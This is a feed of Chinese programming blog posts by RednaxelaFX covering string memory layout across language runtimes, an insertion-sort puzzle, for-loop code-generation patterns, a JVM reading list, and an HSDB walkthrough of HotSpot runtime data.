（Disclaimer：未经许可请勿转载。如需转载请先与我联系。作者：RednaxelaFX -> rednaxelafx.iteye.com） 字符串的一般封装方式的内存布局系列：(0): 拿在手上的是什么(1): 元数据与字符串内容，整体还是分离？  原本我写这个是作为一个讨论JavaScript String的内存布局的回帖的一部分，不过越写越长觉得跑题有点多所以干脆抽出来单独写一系列笔记好了。下面的讨论有原帖背景影响：* JavaScript String分配在栈上还是在堆上？* Lua的string是copy-on-write的吗？请留意讨论的背景。 引用字符串不就是一坨内存么？这坨内存不是就得在栈上或者堆上么？ 嗯…不是。且不说还有全局数据区而字符串也可以存在那里，字符串它不一定只是“一坨内存”。下面展开来看看。 关于字符串的一般封装方式的内存布局  就不说char*这种裸字符串，只说面向对象的字符串封装。进一步限制范围，这里只讨论“扁平”（flat）的字符串，也就是字符串内容按顺序紧密排布在内存中的数据结构，而不讨论像rope那样用链式结构来拼接字符串的数据结构。 回顾上面提到需要完全动态分配内存的条件，其中一个是无法事先判断数据大小。通用的string类型字符串内容的长度不固定，因而整个string的大小无法事先确定，无论是无论可变还是不可变字符串。这就意味着string整体看至少在某些情况下得有一部分（变长的部分）要使用动态内存分配，也就是“分配在堆上”。 string类型的封装可以在几个维度上表现出差异：0、“拿在手上”的是什么？1、字符串元数据与字符串内容打包为整体存放，还是分离存放；2、不同字符串实例是否共享字符串内容；3、字符串是否显式记录长度；4、字符串是否有'\0'结尾（null-terminated），字符串内容是否允许存'\0'（embedded null）；5、外部指针或引用指向字符串的什么位置；6、字符串的存储容量（capacity）是否可以大于字符串内容的长度（length）；7、是否有对齐要求，结尾是否有padding。 0、拿在手上的是什么？  假设有mystringtype s = "foobar";
mystringtype s1 = s; 那拿在手上的“s”与“s1”也要占存储空间，它里面到底装着什么？按照离“真实数据”的距离从近到远，可以有下面几种情况：a) 直接是字符串内容？b) 是指向字符串实体的指针？c) 是指向字符串实体的“指针的指针”？d) 是一个代表某个字符串的token？… a) 直接是字符串内容 比较少见，但并不是不存在。有些C++标准库实现的std::basic_string采用了SSO（short string optimization），可以把短字符串（7个wchar_t或者15个char之类的）直接塞在std::string结构体里；长度大于阈值的字符串就还是把字符串内容分配在堆上。此类实现中，std::string s("foobar");
std::string s1 = s; 里面的s就会直接持有"foobar"内容，而不是“指向字符串实体的指针”。 例如VS2012/VC11的实现就是此类。把VC11的std::string极度简化，它的数据部分如下：class string {
  enum { _BUF_SIZE = 16 };
  union _Bxty {
    // storage for small buffer or pointer to larger one
    char  _Buf[_BUF_SIZE];
    char* _Ptr;
  } _Bx;
  size_t _Mysize; // current length of string
  size_t _Myres;  // current storage reserved for string
}; 可以看到它的第一个实例成员_Bx是个大小为16字节的union，里面既可以装下长度小于_BUF_SIZE的字符串内容，也可以装下一个指针（当字符串长度不小于_BUF_SIZE时）。这种称为SSO的技巧可以让小字符串直接内嵌在std::string实例结构内，此时不需要额外在堆上分配buffer所以减少了堆空间开销，也提高了数据的局部性。当然也有代价，也就是每次要访问字符串内容都得先根据_Myres与_BUF_SIZE的比较来判断当前处于"short string"还是"long string"模式，增加了一点代码的复杂度，不过总体看由于提高了数据局部性，倒未必增加了时间开销。 对"foobar"的例子，在32位x86上VC11的std::string在内存里可以是这样：0x0042FE54  66 6f 6f 62 61 72 00 00 b9 21 a2 00 68 f7 0c 95
0x0042FE64  06 00 00 00 0f 00 00 00  s: 0x0042FE54 (24字节)
 (+0) [ _Bx._Buf = 0x66 ('f') 0x6F ('o') 0x6F ('o') 0x62 ('b') 0x61 ('a') 0x72 ('r') 0x00 ('\0') ... ]
(+16) [ _Mysize  = 0x00000006 ]
(+20) [ _Myres   = 0x0000000F ] 64位x86上则可以是这样：0x000000000024F8E8  66 6f 6f 62 61 72 00 00 69 2f d5 a1 1d d9 ce 01
0x000000000024F8F8  06 00 00 00 00 00 00 00 0f 00 00 00 00 00 00 00 s: 0x000000000024F8E8 (32字节)
 (+0) [ _Bx._Buf = 0x66 ('f') 0x6F ('o') 0x6F ('o') 0x62 ('b') 0x61 ('a') 0x72 ('r') 0x00 ('\0') ... ]
(+16) [ _Mysize  = 0x0000000000000006 ]
(+24) [ _Myres   = 0x000000000000000F ] 头16字节就是_Bx成员的范围，该例中头6字节是"foobar"的内容，接着是'\0'（null-terminate），剩余部分是未使用数据（并不保证清零）；然后是_Mysize = 6与_Myres = 15。 到s1 = s的时候，s1就完整拷贝了s的内容，然后s1里就也内嵌着一份"foobar"了，两者没有共享数据。 b) 是指向字符串实体的指针 许多高级语言虚拟机的实现都会选用这种方案。它们会限制对对象的访问，不允许直接访问对象的内容，而是必须通过引用来间接访问。这样就至少有一层间接。当这个间接层通过“直接指针”来实现时，这种管理内存的方式叫做pointer-based memory management。 例子中的“s”“s1”是引用，引用自身的值是个指针；“s”“s1”两个引用指向同一个String实例。例如说由CLR实现的.NET和由HotSpot VM实现的Java都是这样。后面还会有相关例子所以现在先不展开写。s:              string object:
[ pointer ] --> [ "foobar" ]
             /
s1:         /
[ pointer ]  c) 是指向字符串实体的“指针的指针” 比上一种情况更多一层或多层间接。多出来的间接层通常叫做handle（句柄），相应的内存管理方式叫做handle-based。 句柄的常见实现方式是“指针的指针”（pointer-to-pointer），也就是比直接指针多一层间接：s:             handle table:   string object:
[ handle ] --> [ pointer ] --> [ "foobar" ]
            /
s1:        /
[ handle ] 像Sun JDK 1.0.2里的JVM就是这样的。 使用句柄的好处是实现起来可以偷懒。假如有内存管理器需要移动对象（例如说mark-compact或者copying GC），那就得修正所有相关指针。但遍历所有相关指针需要费点功夫，想偷懒的话就可以像这样增加一个间接层，不允许外界直接拥有指向对象的指针，而是让外界持有句柄，句柄可以是指向“句柄表”（handle table）的指针，而句柄表里的元素才真的持有指向对象的指针。要修正指针的时候只要遍历句柄表来修正即可。 用句柄的坏处就是时间和空间开销都较大。合适的使用场景有两种：1、想偷懒；2、想隐藏信息。 d) 是一个代表某个字符串的token 这算是上一种情况的进一步特例。所谓“句柄”不一定要是“指针的指针”，也可以是更加间接的东西，例如说如果“句柄表”是一个数组，那“句柄”可以只是下标而不是指针；如果“句柄表”是一个稀疏数组（可能用哈希表来实现），那“句柄”可能也只是个稀疏数组的下标（可能用哈希表的键来实现）。这样的句柄有时候也叫做token、ID之类的。 Ruby 1.8.7的Symbol就是这种特殊句柄的实际应用。Ruby的Symbol跟String都可用来表示字符串信息，区别在于：* Symbol是驻留（interned）的，String不是。驻留的意味着相同内容的“Symbol对象实例”只会有一份；* Symbol不可变，String可以可变（也可以是frozen string，那就不可变）。 Symbol在Ruby里是如此特别，在表示Ruby的值的VALUE类型里都有针对Symbol的特化。下面的例子连续使用了3个Symbol，赋值给局部变量s：s = :rednaxelafx
s = :rednaxelapx
s = :rednaxelagx 假定这3个Symbol都是之前没出现过的，那么它们3个就会按顺序被接连intern起来。 局部变量s的类型从C的角度看是VALUE。三次赋值后s的内容（VALUE的值）可能分别是：（例子在Mac OS X 10.7.5/x86-64/Ruby 1.8.7上运行）0x00000000005F390E
0x00000000005F410E
0x00000000005F490E 看不出来有什么联系？换成二进制来看：
ID                                                    | ID_LOCAL | SYMBOL_FLAG
00000000000000000000000000000000000000000101111100111 | 001      | 00001110
00000000000000000000000000000000000000000101111101000 | 001      | 00001110
00000000000000000000000000000000000000000101111101001 | 001      | 00001110 Ruby 1.8.7的VALUE是一种tagged pointer类型：最低8位是用来标识值的特殊类型的标记（tag），其中用来标记Symbol的SYMBOL_FLAG值为0x0e；当VALUE的标记是SYMBOL_FLAG时，紧挨着标记的3位用来表示Symbol的作用域（scope），其中用来标记局部标识符的ID_LOCAL的值为0x01；再上面的高位是与Symbol一一对应的唯一值，是个整数ID。 把ID的部分单独抽出来看，可以看到例子里s的ID分别是3047
3048
3049 是逐个递增上去的整数序列。这个ID与作用域标记一同构成了Ruby里用于表示Symbol的token，可以看作特殊形式的句柄。 这样，Symbol其实没有真正的“对象实例”，至少没有整体存在于堆上的对象实例。整个Symbol系统由3部分组成：* 与Symbol一一对应的ID值，通常嵌在标记为SYMBOL_FLAG的VALUE里。这个ID除去作用域标记外的部分由一个全局计数器生成而来。而Symbol#object_id其实返回的也是由这个ID算出来的值。参考rb_intern()的实现；* 一个全局的symbol table，是个哈希表，记录着ID到实际字符串内容的映射关系；* 存有实际字符串信息的char数组。 知道Symbol#object_id与底层ID之间的映射关系后可以写出这样的小程序：def id_with_scope(object_id)
  # sizeof(RVALUE) = 40 on 64-bit platform for Ruby 1.8.7
  ((object_id << 1) - (4 << 2)) / 40
end
ID_LOCAL = 1
ID_SHIFT = 3
def to_id(sym)
  return nil unless sym.is_a? Symbol
  id_with_scope(sym.object_id) >> ID_SHIFT
end （只对Ruby 1.8系列在64位上正确。其它版本/平台的细节稍有不同，但原理一样。）然后算出某个Symbol对应的ID值：>> to_id :rednaxelafx
=> 3047
>> to_id :rednaxelapx
=> 3048
>> to_id :rednaxelagx
=> 3049  Rubinius的Symbol也是用相似方式实现的。 从驻留的角度看，Ruby的Symbol跟Lua的string相似：两者的所有实例都是驻留的。但前者的引用的值（VALUE）有特殊表现形式，是一个整数ID；而后者还是用普通指针来实现引用的值（Value）。驻留、实例的特殊性，与是否使用指针来表现引用，是两个正交的问题。
              
              
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
奇怪的插入排序？, rednaxelafx.iteye.com.blog.1965297, Sun, 27 Oct 2013 00:11:20 +0800
忍不住想发牢骚。不是我自己遇到的啥面试笔试题啦。 如果给你这样的题目要填空：引用// a是密集的number数组，不让用Array的内建方法
function insertion_sort(a) {
  for (var i = 1; i < a.length; i++) {
    var t = a[i];
    var j = 0;
    for (_____;_____;_____) {
      __________;
    }
    a[j + 1] = t;
  }
} 你会怎么做？ 既然是插入排序，外层循环这里是从前向后排序，应该保证每轮循环进入时a.slice(0, i)都已经排好序，然后为下标为i的元素在前面找到合适的插入位置插进去。 按这填空题的写法，内层循环的变量j是控制遍历和插入的，初始值为0也就是从前向后遍历找插入位置，最终把原本下标为i的元素插入到下标为j+1的地方。 这⋯⋯从前向后遍历要怎么把插入位置之后的元素向后挪，这是不让用Array内建方法的数组啊orz ============================================== 这题咋出得那么诡异⋯正常的插入排序（升序）的话得是这样吧：function insertion_sort(a) {
  for (var i = 1; i < a.length; i++) {
    var t = a[i];
    var j = i;
    for ( ; j > 0 && a[j - 1] > temp; j--) {
      a[j] = a[j - 1];
    }
    a[j] = t;
  }
} 也就是内层循环应该从下标i开始从后向前遍历找插入位置，直观。 或者如果用wiki给的算法的变量名的话：function insertion_sort(a) {
  for (var i = 1; i < a.length; i++) {
    var valueToInsert = a[i];
    var holePos = i;
    for ( ; holePos > 0 && a[holePos - 1] > valueToInsert; j--) {
      a[holePos] = a[holePos - 1];
    }
    a[holePos] = valueToInsert;
  }
}  当然我们可以把这种写法填到原本题目的空里，把原来的j = 0架空就好了：function insertion_sort(a) {
  for (var i = 1; i < a.length; i++) {
    var t = a[i];
    var j = 0;
    for (var k = i; k > 0 && a[k - 1] > t; k--) {
      a[k] = a[k - 1]; j = k - 1;
    }
    a[j + 1] = t;
  }
} 或function insertion_sort(a) {
  for (var i = 1; i < a.length; i++) {
    var t = a[i];
    var j = 0;
    for (j = i - 1; j >= 0 && a[j] > t; j--) {
      a[j + 1] = a[j];
    }
    a[j + 1] = t;
  }
} 但出题的人多半不是这样想的⋯吧？不然给j赋值为0干嘛，忽悠学生？
              
              
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
对C语义的for循环的基本代码生成模式, rednaxelafx.iteye.com.blog.1961217, Sat, 19 Oct 2013 23:12:03 +0800
之前有同学在做龙书（第二版）题目，做到8.4的练习，跟我对答案，然后聊起C语言的for循环的代码生成有几种常见的模式。顺道跟大家分享讨论一下。 C语言的for循环大家应该都很熟悉了，C系语言大都有一样或几乎一样的语法结构：一个循环初始化，一个循环条件，一个循环再初始化，然后一个循环体。通常循环初始化在最前面，再初始化的逻辑直接黏在循环体后面，能有变化的就是循环条件的代码生成到什么位置。 举个例子，for (int i = 0; i < 100; i++) {
  foo();
} 把它翻译为龙书第8章所用的三地址指令，可以用许多不同的模式翻译，这里举三种例子：（注释里标出了基本块的标号、前导基本块、后继基本块，以及基本块的内容等信息。应该很直观吧？） 第一种：循环条件放前面，循环末尾用无条件跳转回到开头：// B0 -> B1: loop initialize
(1)  i = 0
// B1 <- { B0, B2 }, -> { B2, B3 }: loop condition
(2)  if i >= 100 goto (6)  // note: inverted condition
// B2 <- B1, -> B1: loop body
(3)  call foo()
(4)  i = i + 1
(5)  goto (2)
// B3 <- B1: after loop
(6)  ...     第二种：循环条件放后面，在进入循环的地方先无条件跳转到位于循环末尾的条件：// B0 -> B2: loop initialize
(1)  i = 0
(2)  goto (5)
// B1 <- B2, -> B2: loop body
(3)  call foo()
(4)  i = i + 1
// B2 <- { B0, B1 }, -> { B1, B3 }: loop condition
(5)  if i < 100 goto (3)
// B3 <- B2: after loop
(6)  ...     第三种：在进入循环的地方先判断是否跳过循环，然后循环条件放在末尾：// B0 -> { B1, B3 }: loop initialize
(1)  i = 0
(2)  if i >= 100 goto (6)  // note: inverted condition
// B1 <- { B0, B2 }, -> B2: loop body
(3)  call foo()
(4)  i = i + 1
// B2 <- B1, -> { B1, B3 }: loop condition
(5)  if i < 100 goto (3)
// B3 <- { B0, B2 }: after loop
(6)  ...    顺带一提，这个具体例子中循环条件是拿循环变量与一个编译时常量比较，所以这个版本的代码的(2)可以非常轻易的通过条件常量传播消除掉，等价变换为：// B0 -> B1: loop initialize
(1)  i = 0
// B1 <- { B0, B2 }, -> B2: loop body
(2)  call foo()
(3)  i = i + 1
// B2 <- B1, -> { B1, B3 }: loop condition
(4)  if i < 100 goto (2)
// B3 <- { B0, B2 }: after loop
(5)  ...    而前两种模式没那么容易消除其中的指令。  有兴趣的同学可以来讨论下这几种模式的异同点 注意三地址指令的条数，基本块的个数与划分，基本块之间控制流边的总个数，代码的静态与动态的情况的关系，等等。 当然这不是啥新问题，早就有很多论文讨论过了。例如说某篇1978年的小论文⋯名字就先不说了免得剧透。有兴趣的同学自己思考喔。 ＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝ 下面补充些在实际生活种能看到的例子。 1. Java虚拟机规范，Java SE 7版，3.2小节 这里举了几个Java的for循环翻译为字节码的范例，都符合上面说的“第二种”模式。例如把这样的代码：void spin() {
    int i;
    for (i = 0; i < 100; i++) {
        ;    // Loop body is empty
    }
} 翻译为：0:   iconst_0       // Push int constant 0
1:   istore_1       // Store into local variable 1 (i=0)
2:   goto 8         // First time through don't increment
5:   iinc 1, 1       // Increment local variable 1 by 1 (i++)
8:   iload_1        // Push local variable 1 (i)
9:   bipush 100     // Push int constant 100
11:  if_icmplt 5    // Compare and loop if less than (i < 100)
14:  return         // Return void when done 但Oracle JDK6里自带的javac实际用的代码生成策略却是前面说的“第一种”，将上面的例子编译为：0:	iconst_0
1:	istore_1
2:	iload_1
3:	bipush	100
5:	if_icmpge	14
8:	iinc	1, 1
11:	goto	2
14:	return 好玩吧呵呵厚⋯
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
豆列：从表到里学习JVM实现, rednaxelafx.iteye.com.blog.1886170, Thu, 13 Jun 2013 14:13:50 +0800
刚写了个学习JVM用的豆列跟大家分享。 豆列地址：http://book.douban.com/doulist/2545443/  下面把豆列的介绍贴过来。具体书单请到上面的豆列地址那边去看。 在社会化分工、软件行业细分专业化的趋势下，会真的参与到底层系统实现的人肯定是越来越少（比例上说）。真的会参与到JVM实现的人肯定是少数。但如果您对JVM是如何实现的有兴趣、充满好奇，却苦于没有足够系统的知识去深入，那么这个豆列就是为您打好基础而准备的。 如果只想用用Java用用JVM，对深入到实现细节无甚兴趣的话，这个豆列就请不必参考了，免得浪费钱浪费时间精力，呵呵 :-) 本豆列的脉络是： 1. JVM与Java语言规范 要了解JVM是如何实现的，首先必须要知道JVM到底是什么、不是什么，表面上应该提供怎样的功能。为此，JVM规范必读，而且应该时常放在手边参考。而JVM的主要服务对象是Java编程语言。虽然JVM也可以支持众多其它语言，但JVM里的“J”仍然最重要，Java的语言特性影响了JVM的原始设计，所以Java语言规范也应该阅读。特别是，JVM关于线程和同步相关的规定都是交由Java语言规范的相关章节定义的。 2. 虚拟机概论 这里选取《Virtual Machines: Versatile Platforms for Systems and Processes》，帮助您了解“虚拟机”一词到底指代什么，有什么不同类型，大概有哪些实现方法，等等。读完这本书有助获得一个清晰的大局观。 3. 为Java程序员从用户的角度介绍JVM的使用经验的几本书 虽然这几本并没有深入到JVM实现的非常细节的角落，但对已经习惯用Java语言编程的程序员来说，有这么几本书带领自己从熟悉的领域进入不熟悉的领域总是件好事。这几本书中，最深入JVM内部的是《Oracle JRockit: The Definitive Guide》；有丰富调优建议的是《Java Performance》；结合实现大概介绍JVM的抽象概念的是周志明的《深入理解Java虚拟机》。 4. 虚拟机的入门级实现 先通过《Language Implementation Patterns》了解编程语言的一些入门级实现方式，把高级语言编译器与虚拟机两个概念联系起来。然后通过《プログラミング言語を作る》了解非常简易的、用树遍历式以及字节码式解释器实现虚拟机大概是个怎么回事。虽然这本书没有实现JVM，但它介绍的Diksam与早期JVM的实现颇有相似之处，可参考。 接下来《深入嵌入式Java虚拟机》介绍了一种实际的JVM——KVM的实现细节。KVM是CLDC的参考实现（RI）里的JVM，结构简单，资源消耗小，适合入门阅读。 这部分最后是《The School of Niklaus Wirth》，里面有一章介绍了HotSpot Client Compiler (C1)的原始设计思路。这是个非常简单、但相对来说性能还不错的JIT编译器，可用于对JIT编译器的基本了解。这本书本身就很赞，不为学习虚拟机也可以一读。 需要注意的是从“简易的JVM实现”到“高性能、复杂的JVM实现”跨度非常大；前者的许多部分的实现方式与后者相当不同。先从简易的实现开始入手主要是为了对JVM里大概都有些什么组件有所了解。但如果目标是了解高性能JVM的实现，那就必须在GC、编译原理方面打下更好的基础，重新洗一次脑。 5. C++基础书 下面要开始逐渐深入JVM的内部实现，如果没有良好的C或（与？）C++基础会比较吃力。虽然也有几乎完全用Java语言实现的高性能JVM，例如Maxine VM与Jikes RVM，但它们都是研究性质的；商用JVM实现仍然是C与C++的天下。 这里我先推荐C++之父自己写的那本书来入门。虽然BS巨巨后来还出过本新书，而近来也渐渐开始有介绍C++11的入门书，但实际上现在多数JVM实现用的还是C99或非常古老的C++（连C++03都不一定用到了），所以用这本老书应该就够了。然后通过《深度探索C++对象模型》来学习C++对象模型的常见实现方式。这对后面理解Java对象模型的实现很有帮助。 6. GC与编译原理的入门书 GC书总共就那么几本，倒也没啥可挑的。《The Garbage Collection Handbook》是绝对必读。 编译原理的书就稍微尴尬些。现有的编译原理书大都针对静态编译器、针对像C或C++那样的偏静态、偏native的语言。我还没读到过什么编译原理书是专门介绍JIT编译器或者说动态编译器的。静态与动态编译器会有些取舍上、实现策略上的差异，不过还好其核心的原理都是一样的，所以还是可以推荐几本书。龙书用来最初入门，鲸书用来补充一些优化相关的知识，EAC第二版用来学习编译器一种比较良好的逻辑组织方式，最后学一下针对现代机器的优化。 7. 介绍计算机体系结构的书 实际JVM实现里，如果有JIT编译器或者动态编译器那它们的编译目标多半是底层机器的机器码。这就涉及到计算机体系结构了。如果您只对Java语言和抽象的JVM有一定了解，那可以用《计算机组成及汇编语言原理》来入门。这本书比较奇葩，用JVM的字节码指令集来当作真实机器介绍体系结构的概念。我并不太喜欢这本书，但感觉它对有Java背景的初学者来说应该有点用。要注意的是千万别只读这本书来入门，请结合下面要介绍的一本书来重新洗一次脑。如果对C或C++已经有所了解，那《深入理解计算机系统》（CSAPP）是计算机体系结构入门的最适合的书了。 8. 进一步阅读 到此为止各种抽象概念应该都了解得差不多了。那么要在真实的机器上实现高性能JVM，就必须要对真实机器的指令集细节有所了解。x86/x86-64、SPARC、ARM、MIPS，要在哪个平台上做高性能实现就要学习哪个平台的指令集及指令级别优化技巧。这里就不具体推荐书了。 操作系统层面的知识同样重要。像是说JVM要实现线程、内存分配啥的，都可能要跟系统调用或CRT对系统调用的包装打交道。这部分也需要另外找书来读。我回头再考虑下要不要加几本道这个豆列里来。 另外，从80年代开始高级语言虚拟机的实现技术有了突飞猛进的发展，但却没有专门的书对这个领域做综述和导读。多数有用的资料其实还是在论文里。光靠读书是远远不够用的，论文这块也请关注。 顺便广告一下：我的博客里关于虚拟机的文章也推荐给大家参考：http://rednaxelafx.iteye.com/blog/362738  ===================================== 这个豆列没有漏掉 《Inside the Java Virtual Machine, Second Edition》 ，中文版《深入Java虚拟机(原书第2版)》，只是我现在已经不再推荐它。这本书刚出版的时候确实引起了一番学习Java虚拟机的热潮，但其部分内容从现在的角度看已经过时，特别是涉及JVM实现的部分。像火车算法什么的现在已经没有JVM实现使用。不过话说回来，了解了解这些过时的信息也没什么不好，前提是能自己分辨清楚哪些信息是适用于现在的JVM的，而哪些已经成为了历史。 另外有一本清华大学出版社出的《解析Java虚拟机开发——权衡优化.高效和安全的最优方案》，这本纯粹是对周志明的《深入理解Java虚拟机》一书的抄袭。然而抄袭也抄得很不给力，印刷、排版都不如原版。建议不要购买。
              
              
已有 14 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
借HSDB来探索HotSpot VM的运行时数据, rednaxelafx.iteye.com.blog.1847971, Tue, 16 Apr 2013 09:08:44 +0800
（未经许可请勿转载。希望转载请与我联系。） （如果打开此页面时浏览器有点卡住的话请耐心等待片刻。大概是ItEye的代码高亮太耗时了…） 几天前在HLLVM群组有人问了个小问题，说public class Test {
    static Test2 t1 = new Test2();
           Test2 t2 = new Test2();
    public void fn() {
        Test2 t3 = new Test2();     
    }
}
class Test2 {
}
 这个程序的t1、t2、t3三个变量本身（而不是这三个变量所指向的对象）到底在哪里。 TL;DR版回答是：  t1在存Java静态变量的地方，概念上在JVM的方法区（method area）里 t2在Java堆里，作为Test的一个实例的字段存在 t3在Java线程的调用栈里，作为Test.fn()的一个局部变量存在  不过就这么简单的回答大家都会，满足不了对JVM的实现感兴趣的同学们的好奇心。说到底，这“方法区”到底是啥？Java堆在哪里？Java线程的调用栈又是啥样的？ 那就让我们跑点例子，借助调试器来看看在一个实际运行中的JVM里是啥状况。 （下文中代码也传了一份到https://gist.github.com/rednaxelafx/5392451） ============================================================================= 写个启动类来跑上面问题中的代码： public class Main {
    public static void main(String[] args) {
        Test test = new Test();
        test.fn();
    }
} （编译这个Main.java和上面的Test.java时最好加上-g参数生成LocalVariableTable等调试信息，以便后面某些情况下可以用到） 接下来如无特别说明本文将使用Windows 7 64-bit, Oracle JDK 1.7.0_09 Server VM, Serial GC的环境中运行所有例子。 之前在GreenTeaJUG在杭州的活动演示Serviceability Agent的时候也讲到过这是个非常便于探索HotSpot VM内部实现的API，而HSDB则是在SA基础上包装起来的一个调试器。这次我们就用HSDB来做实验。 SA的一个限制是它只实现了调试snapshot的功能：要么要让被调试的目标进程完全暂停，要么就调试core dump。所以我们在用HSDB做实验前，得先让我们的Java程序运行到我们关注的点上才行。 理想情况下我们会希望让这Java程序停在Test.java的第6行，也就是Test.fn()中t3局部变量已经进入作用域，而该方法又尚未返回的地方。怎样才能停在这里呢？ 其实用个Java层的调试器即可。大家平时可能习惯了在Eclipse、IntelliJ IDEA、NetBeans等Java IDE里使用Java层调试器，但为了减少对外部工具的依赖，本文将使用Oracle JDK自带的jdb工具来完成此任务。 jdb跟上面列举的IDE里包含的调试器底下依赖着同一套调试API，也就是Java Platform Debugger Architecture (JPDA)。功能也类似，只是界面是命令行的，表明上看起来不太一样而已。 为了方便后续步骤，启动jdb的时候可以设定让目标Java程序使用serial GC和10MB的Java heap。启动jdb之后可以用stop in命令在指定的Java方法入口处设置断点，然后用run命令指定主类名称来启动Java程序，等跑到断点看看位置是否已经到满足需求，还没到的话可以用step、next之类的命令来向前进。对jdb命令不熟悉的同学可以在启动jdb之后使用help命令来查看命令列表和说明。 具体步骤如下：D:\test>jdb -XX:+UseSerialGC -Xmx10m
Initializing jdb ...
> stop in Test.fn
Deferring breakpoint Test.fn.
It will be set after the class is loaded.
> run Main
run  Main
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
>
VM Started: Set deferred breakpoint Test.fn
Breakpoint hit: "thread=main", Test.fn(), line=5 bci=0
5            Test2 t3 = new Test2();
main[1] next
Step completed: > "thread=main", Test.fn(), line=6 bci=8
6        }
main[1]  按照上述步骤执行完最后一个next命令之后，我们就来到了最初想要的Test.java的第6行，也就是Test.fn()返回前的位置。 接下来把这个jdb窗口放一边，另开一个命令行窗口用jps命令看看我们要调试的Java进程的pid是多少：D:\test>jps
4328 Main
9064 Jps
7716 TTY 可以看到是4328。把这个pid记下来待会儿用。 然后启动HSDB：D:\test>java -cp .;%JAVA_HOME%/lib/sa-jdi.jar sun.jvm.hotspot.HSDB （要留意Linux和Solaris在Oracle/Sun JDK6就可以使用HSDB了，但Windows上要到Oracle JDK7才可以用HSDB） 启动HSDB之后，把它连接到目标进程上。从菜单里选择File -> Attach to HotSpot process： 在弹出的对话框里输入刚才记下的pid然后按OK： 这会儿就连接到目标进程了： 刚开始打开的窗口是Java Threads，里面有个线程列表。双击代表线程的行会打开一个Oop Inspector窗口显示HotSpot VM里记录线程的一些基本信息的C++对象的内容。 不过这里我们更可能会关心的是线程栈的内存数据。先选择main线程，然后点击Java Threads窗口里的工具栏按钮从左数第2个可以打开Stack Memory窗口来显示main线程的栈： Stack Memory窗口的内容有三栏：左起第1栏是内存地址，请让我提醒一下本文里提到“内存地址”的地方都是指虚拟内存意义上的地址，不是“物理内存地址”，请不要弄混了这俩概念；第2栏是该地址上存的数据，以字宽为单位，本文例子中我是在Windows 7 64-bit上跑64位的JDK7的HotSpot VM，字宽是64位（8字节）；第3栏是对数据的注释，竖线表示范围，横线或斜线连接范围与注释文字。 现在看不懂这个窗口里的数据没关系，先放一边，后面再回过头来看。 现在让我们打开HSDB里的控制台，以便用命令来了解更多信息。在菜单里选择Windows -> Console： 然后会得到一个空白的Command Line窗口。在里面敲一下回车就会出现hsdb>提示符。（用过CLHSDB的同学可能会发现这就是把CLHSDB嵌入在了HSDB的图形界面里） 不知道有什么命令可用的同学可以先用help命令看看命令列表。 可以用universe命令来查看GC堆的地址范围和使用情况：hsdb> universe
Heap Parameters:
Gen 0:   eden [0x00000000fa400000,0x00000000fa4aad68,0x00000000fa6b0000) space capacity = 2818048, 24.831088753633722 used
  from [0x00000000fa6b0000,0x00000000fa6b0000,0x00000000fa700000) space capacity = 327680, 0.0 used
  to   [0x00000000fa700000,0x00000000fa700000,0x00000000fa750000) space capacity = 327680, 0.0 usedInvocations: 0
Gen 1:   old  [0x00000000fa750000,0x00000000fa750000,0x00000000fae00000) space capacity = 7012352, 0.0 usedInvocations: 0
  perm [0x00000000fae00000,0x00000000fb078898,0x00000000fc2c0000) space capacity = 21757952, 11.90770160721009 usedInvocations: 0 这里用的是HotSpot VM的serial GC。GC堆由young gen = DefNewGeneration（包括eden和两个survivor space）、old gen = TenuredGeneration和perm gen = PermGen构成。其中young gen和old gen构成了这种配置下HotSpot VM里的Java堆（Java heap），而perm gen不属于Java heap的一部分，它存储的主要是元数据或者叫反射信息，主要用于实现JVM规范里的“方法区”概念。 在我们的Java代码里，执行到Test.fn()末尾为止应该创建了3个Test2的实例。它们必然在GC堆里，但都在哪里呢？用scanoops命令来看：hsdb> scanoops 0x00000000fa400000 0x00000000fc2c0000 Test2
0x00000000fa49a710 Test2
0x00000000fa49a730 Test2
0x00000000fa49a740 Test2 scanoops接受两个必选参数和一个可选参数：必选参数是要扫描的地址范围，一个是起始地址一个是结束地址；可选参数用于指定要扫描什么类型的对象实例。实际扫描的时候会扫出指定的类型及其派生类的实例。 这里可以看到确实扫出了3个Test2的实例。内容有两列：左边是对象的起始地址，右边是对象的实际类型。从它们所在的地址，对照前面universe命令看到的GC堆的地址范围，可以知道它们都在eden里。通过whatis命令可以进一步知道它们都在eden之中分配给main线程的thread-local allocation buffer (TLAB)中：hsdb> whatis 0x00000000fa49a710
Address 0x00000000fa49a710: In thread-local allocation buffer for thread "main" (1)  [0x00000000fa48f490,0x00000000fa49a750,0x00000000fa49d118)
 
hsdb> whatis 0x00000000fa49a730
Address 0x00000000fa49a730: In thread-local allocation buffer for thread "main" (1)  [0x00000000fa48f490,0x00000000fa49a750,0x00000000fa49d118)
 
hsdb> whatis 0x00000000fa49a740
Address 0x00000000fa49a740: In thread-local allocation buffer for thread "main" (1)  [0x00000000fa48f490,0x00000000fa49a750,0x00000000fa49d118)
 
hsdb>   还可以用inspect命令来查看对象的内容：hsdb> inspect 0x00000000fa49a710
instance of Oop for Test2 @ 0x00000000fa49a710 @ 0x00000000fa49a710 (size = 16)
_mark: 1 可见一个Test2的实例要16字节。因为Test2类没有任何Java层的实例字段，这里就没有任何Java实例字段可显示。不过本来这里还应该显示一行：_metadata._compressed_klass: InstanceKlass for Test2 @ 0x00000000fb078608 不幸因为这个版本的HotSpot VM里带的SA有bug所以没显示出来。此bug在新版里已修。 还想看到更裸的数据的同学可以用mem命令来看实际内存里的数据长啥样：hsdb> mem 0x00000000fa49a710 2
0x00000000fa49a710: 0x0000000000000001 
0x00000000fa49a718: 0x00000000fb078608  mem命令接受的两个参数都必选，一个是起始地址，另一个是以字宽为单位的“长度”。我们知道一个Test2实例有16字节，所以给定长度为2来看。 上面的数字都是啥来的呢？0x00000000fa49a710:  _mark:                        0x0000000000000001 
0x00000000fa49a718:  _metadata._compressed_klass:  0xfb078608
